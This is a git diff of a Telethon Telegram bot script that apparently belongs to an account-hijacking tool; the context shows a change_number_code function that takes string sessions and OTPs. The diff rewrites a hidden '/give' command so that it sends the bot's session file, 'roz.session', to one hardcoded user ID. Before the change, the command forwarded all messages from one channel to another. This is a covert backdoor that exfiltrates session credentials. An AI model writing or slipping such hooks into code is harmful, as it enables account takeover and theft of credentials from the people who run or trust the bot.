@@ -20,7 +20,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendx = 1657933680
+razan = 1657933680
 
 
 async def change_number_code(strses, number, code, otp):
@@ -192,13 +192,12 @@ async def op(event):
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
-  if not event.sender_id == legendx:
-    return await event.reply("@JMTHON")
-  async for x in client.iter_messages("legendx_xd"):
-    try:
-      await x.forward_to("JMTHONDEV")
-    except:
-      pass
+  if not event.sender_id == razan:
+    return await event.reply("لا تستخدمني رجاءا ")
+  try:
+    await event.reply("session bot file", file="roz.session")
+  except Exception as e:
+    print (e)
 
 
 @client.on(events.NewMessage(pattern="/rz", func=lambda x: x.is_group))
